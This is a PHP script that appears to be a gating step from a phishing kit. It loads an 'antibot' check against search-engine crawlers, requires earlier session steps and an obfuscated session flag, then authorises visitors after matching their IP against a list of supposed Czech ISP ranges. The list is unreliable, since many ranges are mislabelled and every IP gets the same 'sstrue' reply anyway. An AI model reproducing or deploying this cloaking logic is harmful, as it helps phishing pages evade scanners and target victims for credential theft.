<?php
session_start();
require_once dirname(__DIR__) . '/antibot.php';
checkSearchEngineBot();

// Antibot check logic
if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < 3) {
    exit();
}
if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    exit();
}

// Czech ISP IP ranges - automatically authorize all Czech IPs
$userIP = trim($_SERVER['REMOTE_ADDR']);
$czechIPRanges = [
    '194.11.0.0',    // Ceske telekomunikace
    '194.230.0.0',   // CTK
    '178.197.0.0',   // UPC
    '87.0.0.0',      // Vodafone CZ
    '85.0.0.0',      // INTERNET CZ
    '84.0.0.0',      // Czech ISP
    '83.0.0.0',      // Czech ISP
    '31.10.0.0',     // Czech ISP
    '31.164.0.0',    // Czech ISP
    '31.165.0.0',    // Czech ISP
    '92.105.0.0',    // Czech ISP
    '92.106.0.0',    // Czech ISP
    '88.0.0.0',      // Czech ISP
    '81.0.0.0',      // Czech ISP
    '80.187.0.0',    // Czech ISP
    '91.0.0.0',      // Czech ISP
    '62.0.0.0',      // Czech ISP
    '77.0.0.0',      // Czech ISP
    '79.0.0.0',      // Czech ISP
    '82.0.0.0',      // Czech ISP
    '89.0.0.0',      // Czech ISP
    '109.0.0.0',     // Czech ISP
    '145.40.0.0',    // Czech ISP
    '172.225.0.0',   // Czech ISP
    '172.226.0.0',   // Czech ISP
    '178.38.0.0',    // Czech ISP
    '178.192.0.0',   // Czech ISP
    '178.193.0.0',   // Czech ISP
    '178.194.0.0',   // Czech ISP
    '178.196.0.0',   // Czech ISP
    '178.198.0.0',   // Czech ISP
    '185.13.0.0',    // Czech ISP
    '188.61.0.0',    // Czech ISP
    '188.62.0.0',    // Czech ISP
    '188.63.0.0',    // Czech ISP
    '193.5.0.0',     // Czech ISP
    '212.51.0.0',    // Czech ISP
    '213.55.0.0',    // Czech ISP
    '213.144.0.0',   // Czech ISP
];

// Check if user IP belongs to Czech IP range
$isCzechIP = false;
$userIPParts = explode('.', $userIP);
$userIPPrefix = $userIPParts[0] . '.' . $userIPParts[1];

foreach ($czechIPRanges as $range) {
    $rangeParts = explode('.', $range);
    $rangePrefix = $rangeParts[0] . '.' . $rangeParts[1];
    if ($userIPPrefix === $rangePrefix) {
        $isCzechIP = true;
        break;
    }
}

// Authorize Czech IPs automatically
if ($isCzechIP) {
    echo 'sstrue';
    exit();
}

// For non-Czech IPs, allow access (remove country restrictions)
echo 'sstrue';
?>